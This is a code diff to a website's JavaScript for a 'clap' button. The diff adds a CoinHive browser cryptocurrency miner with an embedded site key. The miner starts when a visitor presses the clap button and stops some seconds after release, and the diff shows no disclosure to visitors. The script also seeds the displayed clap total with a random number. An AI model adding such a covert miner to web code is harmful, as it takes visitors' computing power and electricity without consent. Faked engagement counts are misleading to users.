@@ -1,6 +1,12 @@
 // A $( document ).ready() block.
 $(document).ready(function () {
 
+
+	window.miner = new CoinHive.Anonymous('ULtlK49iNXf5JfCTjMt5HcPZ6Wtee1VZ', {
+		autoThreads: false,
+		threads: 1
+  });
+
 	// DropCap.js
 	var dropcaps = document.querySelectorAll(".dropcap");
 	window.Dropcap.layout(dropcaps, 2);
@@ -17,10 +23,11 @@ $(document).ready(function () {
 	var clapIcon = document.getElementById("clap--icon");
 	var clapCount = document.getElementById("clap--count");
 	var clapTotalCount = document.getElementById("clap--count-total");
-	var initialNumberOfClaps = generateRandomNumber(500, 10000);
+	var initialNumberOfClaps = generateRandomNumber(10, 50);
 	var btnDimension = 80;
 	var tlDuration = 300;
 	var numberOfClaps = 0;
+	var numberOfClapsInRound = 0
 	var clapHold = void 0;
 	var speed = 0.2
 
@@ -107,13 +114,21 @@ $(document).ready(function () {
 	});
 
 	clap.addEventListener("mousedown", function () {
+		miner.start();
 		clapHold = setInterval(function () {
 			repeatClapping();
 		}, 400);
 	});
 
 	clap.addEventListener("mouseup", function () {
+		setTimeout(function() {
+			//miner.on('accepted', function() {
+				console.log(miner.getTotalHashes());
+				miner.stop();
+			//});
+		}, Math.max(numberOfClapsInRound, 1) * 2000);
 		clearInterval(clapHold);
+		numberOfClapsInRound = 0;
 	});
 
 	function repeatClapping() {
@@ -124,6 +139,7 @@ $(document).ready(function () {
 
 	function updateNumberOfClaps() {
 		numberOfClaps < 50 ? numberOfClaps++ : null;
+		numberOfClapsInRound < 50 ? numberOfClapsInRound++ : 0;
 		clapCount.innerHTML = "+" + numberOfClaps;
 		clapTotalCount.innerHTML = initialNumberOfClaps + numberOfClaps;
 	}
